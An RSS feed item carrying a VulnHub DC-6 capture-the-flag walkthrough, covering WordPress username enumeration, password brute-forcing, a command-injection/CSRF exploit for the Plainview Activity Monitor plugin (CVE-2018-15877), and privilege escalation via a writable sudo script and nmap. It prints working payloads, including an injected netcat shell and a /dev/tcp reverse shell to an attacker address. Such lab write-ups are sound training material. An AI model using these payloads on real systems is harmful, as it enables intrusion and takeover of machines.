@@ -1,0 +1,306 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
+  <channel>
+    <title>WordPress on Ef&#39;s log</title>
+    <link>https://fahmifj.github.io/tags/wordpress/</link>
+    <description>Recent content in WordPress on Ef&#39;s log</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <lastBuildDate>Sun, 30 May 2021 21:47:03 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/wordpress/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>VulnHub - DC-6</title>
+      <link>https://fahmifj.github.io/writeups/vulnhub/vh-dc6/</link>
+      <pubDate>Sun, 30 May 2021 21:47:03 +0700</pubDate>
+      
+      <guid>https://fahmifj.github.io/writeups/vulnhub/vh-dc6/</guid>
+      <description>DC-6 starts off by enumerating usernames from a WordPress website. I&amp;rsquo;m able to gain a set of credentials to log into the admin panel with a brute-force attack. There is a WP Plugin which can be leveraged to gain a foothold on the system. A to-do note containing the user&amp;rsquo;s credentials is discovered while enumerating the home directory. For the root part, there is a sudo privileges on a writable backup script and nmap which allows me to escalate to other users then straight to root.</description>
+      <content:encoded><![CDATA[<p>DC-6 starts off by enumerating usernames from a WordPress website. I&rsquo;m able to gain a set of credentials to log into the admin panel with a brute-force attack. There is a WP Plugin which can be leveraged to gain a foothold on the system. A to-do note containing the user&rsquo;s credentials is discovered while enumerating the home directory. For the root part, there is a sudo privileges on a writable backup script and <code>nmap</code> which allows me to escalate to other users then straight to root.</p>
+<h3 id="skills-learned">Skills Learned</h3>
+<ul>
+<li>WordPress enumeration and plugin exploitation</li>
+<li>Exploiting sudo privileges on nmap</li>
+</ul>
+<h3 id="tools">Tools</h3>
+<ul>
+<li>Nmap</li>
+<li>Arpscan</li>
+<li>WPScan</li>
+<li>BurpSuite</li>
+</ul>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<h3 id="host-discovery---arpscan">Host Discovery - arpscan</h3>
+<p>Because <code>192.168.2.1</code> and <code>192.168.2.2</code> are virtual gateway addresses, the target machine&rsquo;s IP address is most likely <code>192.168.2.104</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «dc-6» «192.168.43.234» 
+$ arp-scan --interface eth0 <span style="color:#e6db74">&#39;192.168.2.0/24&#39;</span> | tee scans/00-arp-scan-dc6
+Interface: eth0, type: EN10MB, MAC: 08:00:27:0b:94:f0, IPv4: 192.168.2.103
+Starting arp-scan 1.9.7 with <span style="color:#ae81ff">256</span> hosts <span style="color:#f92672">(</span>https://github.com/royhills/arp-scan<span style="color:#f92672">)</span>
+192.168.2.1     08:00:27:e8:e9:78       PCS Systemtechnik GmbH
+192.168.2.2     0a:00:27:00:00:07       <span style="color:#f92672">(</span>Unknown: locally administered<span style="color:#f92672">)</span>
+192.168.2.104   08:00:27:ac:db:5f       PCS Systemtechnik GmbH
+</code></pre></div><h3 id="nmap">Nmap</h3>
+<p>With initial scan, <code>nmap</code> shows two ports open: SSH on port 22 and Apache Web Server on port 80.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «dc-6» «192.168.43.234» 
+$ nmap -n -sC -sV -oA scans/10-initial-dc6 <span style="color:#e6db74">&#39;192.168.2.104&#39;</span> -v
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
+| ssh-hostkey: 
+|   <span style="color:#ae81ff">2048</span> 3e:52:ce:ce:01:b6:94:eb:7b:03:7d:be:08:7f:5f:fd <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+|   <span style="color:#ae81ff">256</span> 3c:83:65:71:dd:73:d7:23:f8:83:0d:e3:46:bc:b5:6f <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+|_  <span style="color:#ae81ff">256</span> 41:89:9e:85:ae:30:5b:e0:8f:a4:68:71:06:b4:15:ee <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+80/tcp open  http    Apache httpd 2.4.25 <span style="color:#f92672">((</span>Debian<span style="color:#f92672">))</span>
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.25 <span style="color:#f92672">(</span>Debian<span style="color:#f92672">)</span>
+|_http-title: Did not follow redirect to http://wordy/
+|_https-redirect: ERROR: Script execution failed <span style="color:#f92672">(</span>use -d to debug<span style="color:#f92672">)</span>
+MAC Address: 08:00:27:AC:DB:5F <span style="color:#f92672">(</span>Oracle VirtualBox virtual NIC<span style="color:#f92672">)</span>
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+<span style="color:#75715e"># Nmap done at Sat Apr 10 01:42:04 2021 -- 1 IP address (1 host up) scanned in 15.00 second</span>
+</code></pre></div><p>From the results above, there&rsquo;s a redirection to <code>http://wordy/</code> on port 80. To properly resolve the web, I&rsquo;ll add wordy to my <code>/etc/hosts</code> file.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">192.168.1.104   wordy
+</code></pre></div><h2 id="enumeration">Enumeration</h2>
+<h3 id="tcp-80---website">TCP 80 - Website</h3>
+<p>This page clearly states that it&rsquo;s a WordPress site.</p>
+<p><div class="img-container"><img src="imgs/image-20210419191210177.png" alt="image-20210419191210177"  /></div>
+</p>
+<p>Nothing interesting to explore, but the text <code>secure plugins</code> seems to be a hint from the machine&rsquo;s author.</p>
+<p>I ran a <code>gobuster</code> scan but found nothing useful.</p>
+<h4 id="nmap-nse">Nmap NSE</h4>
+<p><code>nmap</code> script scan found some usernames.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «dc-6» «192.168.43.234» 
+$ nmap -p <span style="color:#ae81ff">80</span> --script <span style="color:#e6db74">&#34;http-wordpress*&#34;</span> wordy
+Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2021-04-11 23:13 EDT
+Nmap scan report <span style="color:#66d9ef">for</span> wordy <span style="color:#f92672">(</span>192.168.2.104<span style="color:#f92672">)</span>
+Host is up <span style="color:#f92672">(</span>0.00069s latency<span style="color:#f92672">)</span>.
+
+PORT   STATE SERVICE
+80/tcp open  http
+...
+|   /: WordPress version: 5.1.1
+...
+| http-wordpress-users: 
+| Username found: admin
+| Username found: graham
+| Username found: mark
+| Username found: sarah
+| Username found: jens
+|_Search stopped at ID <span style="color:#75715e">#25. Increase the upper limit if necessary with &#39;http-wordpress-users.limit&#39;</span>
+MAC Address: 08:00:27:AC:DB:5F <span style="color:#f92672">(</span>Oracle VirtualBox virtual NIC<span style="color:#f92672">)</span>
+
+Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 22.48 seconds
+</code></pre></div><h4 id="wpscan">WPScan</h4>
+<p><code>wpscan</code> identifies two vulnerable WP plugins: an RCE and a user role privilege escalation.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «dc-6» «192.168.43.234» 
+$ wpscan --url http://wordy/ --enumerate vp --api-token token123 --plugins-detection aggressive
+...
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> plainview-activity-monitor
+ | Location: http://wordy/wp-content/plugins/plainview-activity-monitor/
+ | Last Updated: 2018-08-26T15:08:00.000Z
+ | Readme: http://wordy/wp-content/plugins/plainview-activity-monitor/readme.txt
+ | <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> The version is out of date, the latest version is <span style="color:#ae81ff">20180826</span>
+ | <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Directory listing is enabled
+ |
+ | Found By: Known Locations <span style="color:#f92672">(</span>Aggressive Detection<span style="color:#f92672">)</span>
+ |  - http://wordy/wp-content/plugins/plainview-activity-monitor/, status: <span style="color:#ae81ff">200</span>
+ |
+ | <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> <span style="color:#ae81ff">1</span> vulnerability identified:
+ |
+ | <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Title: Plainview Activity Monitor &lt;<span style="color:#f92672">=</span> <span style="color:#ae81ff">20161228</span> - Remote Command Execution <span style="color:#f92672">(</span>RCE<span style="color:#f92672">)</span>
+ |     Fixed in: <span style="color:#ae81ff">20180826</span>
+ |     References:
+ |      - https://wpscan.com/vulnerability/ab749b6c-c405-40e0-8417-0fe1bdb8537c
+ |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name<span style="color:#f92672">=</span>CVE-2018-15877
+ |      - https://plugins.trac.wordpress.org/changeset/1930493/plainview-activity-monitor
+ |      - https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_plainview_activity_monitor_rce/
+ |
+ | Version: <span style="color:#ae81ff">20161228</span> <span style="color:#f92672">(</span>50% confidence<span style="color:#f92672">)</span>
+ | Found By: Readme - ChangeLog Section <span style="color:#f92672">(</span>Aggressive Detection<span style="color:#f92672">)</span>
+ |  - http://wordy/wp-content/plugins/plainview-activity-monitor/readme.txt
+
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> user-role-editor
+ | Location: http://wordy/wp-content/plugins/user-role-editor/
+ | Last Updated: 2021-04-05T02:38:00.000Z
+ | Readme: http://wordy/wp-content/plugins/user-role-editor/readme.txt
+ | <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> The version is out of date, the latest version is 4.59
+ |
+ | Found By: Known Locations <span style="color:#f92672">(</span>Aggressive Detection<span style="color:#f92672">)</span>
+ |  - http://wordy/wp-content/plugins/user-role-editor/, status: <span style="color:#ae81ff">200</span>
+ |
+ | <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> <span style="color:#ae81ff">1</span> vulnerability identified:
+ |
+ | <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Title: User Role Editor &lt;<span style="color:#f92672">=</span> 4.24 - Privilege Escalation
+ |     Fixed in: 4.25
+ |     References:
+ |      - https://wpscan.com/vulnerability/85e595f5-9f04-4799-9a09-c6675071b12c
+ |      - https://www.wordfence.com/blog/2016/04/user-role-editor-vulnerability/
+ |
+ | Version: 4.24 <span style="color:#f92672">(</span>80% confidence<span style="color:#f92672">)</span>
+ | Found By: Readme - Stable Tag <span style="color:#f92672">(</span>Aggressive Detection<span style="color:#f92672">)</span>
+ |  - http://wordy/wp-content/plugins/user-role-editor/readme.txt
+...
+</code></pre></div><p>I&rsquo;m interested with the RCE one, but before that I&rsquo;ll have to find creds.</p>
+<h4 id="brute-forcing-passwords">Brute-forcing passwords</h4>
+<p>At that time, I was stuck for a couple of hours. Asking for a nudge and the answer was to brute force, I didn&rsquo;t know that the box&rsquo;s author actually gave us a hint to create a custom wordlist from <code>rokyou.txt</code>.</p>
+<p><div class="img-container"><img src="imgs/image-20210419183629054.png" alt="image-20210419183629054"  /></div>
+</p>
+<p>I&rsquo;ll create new wordlist from <code>rockyou.txt</code> and then use it to perform a brute force using <code>wpscan</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «dc-6» «192.168.43.234» 
+$ cat /usr/share/wordlists/rockyou.txt | grep k01 &gt; passwords.txt
+→ root@iamf «dc-6» «192.168.43.234» 
+$ wpscan --url http://wordy/ --usernames users --passwords passwords.txt 
+</code></pre></div><p>It returns one valid credentials: <code>mark:helpdesk10</code>.</p>
+<p><div class="img-container"><img src="imgs/image-20210419184715108.png" alt="image-20210419184715108"  /></div>
+</p>
+<h2 id="foothold">Foothold</h2>
+<h3 id="shell-as-www-data">Shell as www-data</h3>
+<h4 id="wp-dashboard">WP Dashboard</h4>
+<p>With the credentials I obtained, I can login into the admin panel.</p>
+<p><div class="img-container"><img src="imgs/image-20210531002724008.png" alt="image-20210531002724008"  /></div>
+</p>
+<h4 id="plainview-activity-monitor---rce--cve-2018-15877">Plainview Activity Monitor - RCE  (CVE-2018-15877)</h4>
+<p>From the previous <code>wpscan</code>, I searched the exploit PoC for Plainview Activity Monitor RCE and found this from <a href="https://www.exploit-db.com/exploits/45274">exploit-db</a>:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">html</span>&gt;
+  <span style="color:#75715e">&lt;!--  Wordpress Plainview Activity Monitor RCE
+</span><span style="color:#75715e">        [+] Version: 20161228 and possibly prior
+</span><span style="color:#75715e">        [+] Description: Combine OS Commanding and CSRF to get reverse shell
+</span><span style="color:#75715e">        [+] Author: LydA(c)ric LEFEBVRE
+</span><span style="color:#75715e">        [+] CVE-ID: CVE-2018-15877
+</span><span style="color:#75715e">        [+] Usage: Replace 127.0.0.1 &amp; 9999 with you ip and port to get reverse shell
+</span><span style="color:#75715e">        [+] Note: Many reflected XSS exists on this plugin and can be combine with this exploit as well
+</span><span style="color:#75715e">  --&gt;</span>
+  &lt;<span style="color:#f92672">body</span>&gt;
+  &lt;<span style="color:#f92672">script</span>&gt;<span style="color:#a6e22e">history</span>.<span style="color:#a6e22e">pushState</span>(<span style="color:#e6db74">&#39;&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>, <span style="color:#e6db74">&#39;/&#39;</span>)&lt;/<span style="color:#f92672">script</span>&gt;
+    &lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">action</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://localhost:8000/wp-admin/admin.php?page=plainview_activity_monitor&amp;tab=activity_tools&#34;</span> <span style="color:#a6e22e">method</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;POST&#34;</span> <span style="color:#a6e22e">enctype</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;multipart/form-data&#34;</span>&gt;
+      &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;hidden&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;ip&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;google.fr| nc -nlvp 127.0.0.1 9999 -e /bin/bash&#34;</span> /&gt;
+      &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;hidden&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;lookup&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Lookup&#34;</span> /&gt;
+      &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;submit&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Submit request&#34;</span> /&gt;
+    &lt;/<span style="color:#f92672">form</span>&gt;
+  &lt;/<span style="color:#f92672">body</span>&gt;
+&lt;/<span style="color:#f92672">html</span>&gt;
+</code></pre></div><p>The vulnerability comes from this IP tools feature.</p>
+<p><div class="img-container"><img src="imgs/image-20210419194814055.png" alt="image-20210419194814055"  /></div>
+</p>
+<p>I&rsquo;ll hit the lookup button and intercept the request on Burp.</p>
+<p>RCE can be achieved by adding a set of malicious OS commands after the command pipe <code>|</code>, semi colon <code>;</code> (stacked command), or logical OR <code>||</code> at the <code>ip</code> section. In this case, I send a reverse shell.</p>
+<p>Here is with command pipe.</p>
+<p><div class="img-container"><img src="imgs/image-20210419194314291.png" alt="image-20210419194314291"  /></div>
+</p>
+<p>And this one by stacking commands with semicolon.</p>
+<p><div class="img-container"><img src="imgs/image-20210419200042885.png" alt="image-20210419200042885"  /></div>
+</p>
+<p>I can not find the plugin&rsquo;s source code, my best guess it can be something like this.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">...</span>
+$ip <span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#39;ip&#39;</span>]
+$do_something <span style="color:#f92672">=</span> <span style="color:#a6e22e">exec</span>(<span style="color:#e6db74">&#34;dig </span><span style="color:#e6db74">$ip</span><span style="color:#e6db74">&#34;</span>)
+<span style="color:#f92672">...</span>
+</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="shell-as-graham">Shell as graham</h3>
+<h4 id="internal-enumeration">Internal enumeration</h4>
+<p>The home directory is readable by <code>www-data</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@dc-6:/var/www/html/wp-admin$ find /home 2&gt;/dev/null
+find /home 2&gt;/dev/null
+...
+/home/jens/backups.sh
+....
+/home/mark/stuff/things-to-do.txt
+....
+</code></pre></div><p>I immediately checked the contents of <code>backups.sh</code> and <code>things-to-do.txt</code>.</p>
+<p>The <code>backups.sh</code> script is writable by group <code>devs</code>, and I&rsquo;ll note that.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@dc-6:/var/www/html/wp-admin$ ls -l /home/jens/backups.sh
+ls -l /home/jens/backups.sh
+-rwxrwxr-x <span style="color:#ae81ff">1</span> jens devs <span style="color:#ae81ff">50</span> Apr <span style="color:#ae81ff">26</span>  <span style="color:#ae81ff">2019</span> /home/jens/backups.sh
+www-data@dc-6:/var/www/html/wp-admin$ cat /home/jens/backups.sh
+cat /home/jens/backups.sh
+<span style="color:#75715e">#!/bin/bash</span>
+tar -czf backups.tar.gz /var/www/html
+</code></pre></div><p>And this <code>things-to-do.txt</code> contains graham&rsquo;s credentials.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">www-data@dc-6:/var/www/html/wp-admin$ cat /home/mark/stuff/things-to-do.txt
+cat /home/mark/stuff/things-to-do.txt
+Things to do:
+
+- Restore full functionality for the hyperdrive (need to speak to Jens)
+- Buy present for Sarah&#39;s farewell party
+- Add new user: graham - GSo7isUM1D4 - done
+- Apply for the OSCP course
+- Buy new laptop for Sarah&#39;s replacement
+</code></pre></div><h4 id="ssh---graham">SSH - graham</h4>
+<p>I tried the graham&rsquo;s creds, <code>graham:GSo7isUM1D4</code>, on SSH, and it worked.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">→ root@iamf «dc-6» «192.168.43.234» 
+$ ssh graham@192.168.2.104
+graham@192.168.2.104&#39;s password: 
+Linux dc-6 4.9.0-8-amd64 #1 SMP Debian 4.9.144-3.1 (2019-02-19) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+graham@dc-6:~$ id
+uid=1001(graham) gid=1001(graham) groups=1001(graham),1005(devs)
+</code></pre></div><h3 id="shell-as-jens">Shell as jens</h3>
+<h4 id="sudo-privileges---backupssh">Sudo privileges - backups.sh</h4>
+<p>User <code>graham</code> has sudo privileges on the <code>backups.sh</code> script, and this allows me to run the script as user <code>jens</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">graham@dc-6:~$ sudo -l
+Matching Defaults entries for graham on dc-6:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User graham may run the following commands on dc-6:
+    (jens) NOPASSWD: /home/jens/backups.sh
+graham@dc-6:~$ cat /home/jens/backups.sh
+#!/bin/bash
+tar -czf backups.tar.gz /var/www/html
+graham@dc-6:~$ ls -l /home/jens/backups.sh
+-rwxrwxr-x 1 jens devs 50 Apr 26  2019 /home/jens/backups.sh
+</code></pre></div><p>Because the script is also writable by graham (<code>devs</code> group), I can exploit this to escalate myself to <code>jens</code> by adding a reverse shell line to the script and then run it with sudo.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">graham@dc-6:~$ echo <span style="color:#e6db74">&#39;bash -i &gt;&amp; /dev/tcp/192.168.2.108/9000 0&gt;&amp;1&#39;</span> &gt;&gt; /home/jens/backups.sh
+</code></pre></div><p><div class="img-container"><img src="imgs/image-20210419204321872.png" alt="image-20210419204321872"  /></div>
+</p>
+<h3 id="shell-as--root">Shell as  root</h3>
+<h4 id="sudo-privileges---nmap">Sudo privileges - nmap</h4>
+<p>I found out that user <code>jens</code> is allowed to execute <code>nmap</code> as root user.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">jens@dc-6:/home/graham$ sudo -l
+sudo -l
+Matching Defaults entries <span style="color:#66d9ef">for</span> jens on dc-6:
+    env_reset, mail_badpass,
+    secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin
+
+User jens may run the following commands on dc-6:
+    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> NOPASSWD: /usr/bin/nmap
+</code></pre></div><p>I&rsquo;ll also exploit this using reference from <a href="https://gtfobins.github.io/gtfobins/nmap/">GTFObins</a>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">jens@dc-6:/home/graham$ TF<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>mktemp<span style="color:#66d9ef">)</span>
+jens@dc-6:/home/graham$ echo <span style="color:#e6db74">&#39;os.execute(&#34;/bin/sh&#34;)&#39;</span> &gt; $TF
+jens@dc-6:/home/graham$ sudo nmap --script<span style="color:#f92672">=</span>$TF
+</code></pre></div><p><div class="img-container"><img src="imgs/image-20210419204616406.png" alt="image-20210419204616406"  /></div>
+</p>
+<p>And here is the flag.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">root@dc-6:~# cat theflag.txt 
+
+
+Yb        dP 888888 88     88         8888b.   dP&#34;Yb  88b 88 888888 d8b 
+ Yb  db  dP  88__   88     88          8I  Yb dP   Yb 88Yb88 88__   Y8P 
+  YbdPYbdP   88&#34;&#34;   88  .o 88  .o      8I  dY Yb   dP 88 Y88 88&#34;&#34;   `&#34;&#39; 
+   YP  YP    888888 88ood8 88ood8     8888Y&#34;   YbodP  88  Y8 888888 (8) 
+
+
+Congratulations!!!
+
+Hope you enjoyed DC-6.  Just wanted to send a big thanks out there to all those
+who have provided feedback, and who have taken time to complete these little
+challenges.
+
+If you enjoyed this CTF, send me a tweet via @DCAU7.
+</code></pre></div><hr>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://www.vulnhub.com/entry/dc-6,315/">https://www.vulnhub.com/entry/dc-6,315/</a></li>
+<li><a href="https://gtfobins.github.io/gtfobins/nmap/">https://gtfobins.github.io/gtfobins/nmap/</a></li>
+</ul>
+]]></content:encoded>
+    </item>
+    
+  </channel>
+</rss>
